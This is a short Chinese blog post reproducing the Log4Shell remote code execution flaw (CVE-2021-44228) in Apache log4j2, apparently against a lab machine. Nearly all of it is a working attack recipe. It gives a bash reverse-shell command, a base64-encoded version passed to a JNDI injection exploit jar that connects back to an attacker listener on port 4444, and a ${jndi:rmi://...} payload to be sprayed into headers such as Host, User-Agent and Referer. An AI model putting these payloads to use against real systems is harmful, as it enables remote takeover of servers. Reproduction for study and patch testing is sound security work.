# CVE-2021-44228 Apache log4j2 远程代码执行漏洞 - lisenMiller - 博客园

> 原文：[`www.cnblogs.com/lisenMiller/p/17604000.html`](https://www.cnblogs.com/lisenMiller/p/17604000.html)

![](img/8be3b6cf3c19442bf219effe4ac75300.png)

###  漏洞复现

验证是否存在 apache log4j2 漏洞

https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0

反弹 shell

bash -i >& /dev/tcp/ip/port 0>&1

将此命令进行 javaruntimebash 编码

https://www.jackson-t.ca/runtime-exec-payloads.html

java -jar jndi-injection-exploit-1.0-snapshot-all.jar -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMi4xMjkvNDQ0NCAwPiYx}| {base64 -d}| {bash -i}" -A kali's ip

tips：windows 使用此 jar 会不会生成可以利用的 poc

![](img/1ad102fab2cc771000ccfa777547ba82.png)

同时开启 4444 端口

替代 burp 中的所有能够存储成日志的地方所有都放上去${jndi:rmi://192.168.232.129:1099/fxuine}

![](img/3a2125a0e4f23dd461294c5db53e8225.png)

 不仅仅是 payload，还有 host，ua，referer 等所有的字段都能探测有无 log4j2

发包后成功反弹 shell